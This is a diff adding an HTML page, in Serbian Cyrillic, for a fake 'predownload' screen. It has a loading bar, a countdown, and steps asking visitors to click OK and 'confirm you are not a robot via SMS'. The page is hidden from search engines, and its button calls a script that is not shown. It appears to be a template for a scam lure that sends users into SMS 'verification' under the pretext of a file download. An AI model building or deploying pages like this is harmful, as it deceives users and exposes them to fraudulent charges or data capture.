@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0,user-scalable=no">
+    <title>Predownload Page</title>
+    <meta name="format-detection" content="telephone=no">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="googlebot" content="noindex">
+    <meta name="theme-color" content="#3c5a96">
+    <link rel="stylesheet" href="css/style.min.css">
+    <script>
+        var afurl = 'https://www.google.com/';
+    </script>
+</head>
+
+<body>
+    <center>
+        <div class="container">
+            <div class="title">
+                Обрада преузимања ...
+            </div>
+            <div class="loadbar">
+                <img class="imgloadbar" src="img/loadbar.gif">
+            </div>
+            <div class="txt">
+                Ако се преузимање не покрене аутоматски.
+            </div>
+            <div class="desript">
+                <div class="s1">Корак 1: Кликните на дугме У реду да бисте довршили преузимање.</div>
+                <div class="s2">Корак 2: Потврдите да нисте робот путем СМС-а</div>
+            </div>
+            <div class="btnwrap">
+                <a id="btnprize" onclick="goto()" href="javascript:void(0)">
+                    <div class="bluebtn">OK</div>
+                </a>
+            </div>
+        </div>
+        <div style="margin: 15px auto; font-size: 12px;">Филе аваилабле: <span id="timer_inp" style="font-weight: 700; color: red;">15</span> секунди</div>
+    </center>
+
+    <!-- scripts -->
+    <script src="js/main.js"></script>
+
+</body>
+</html>
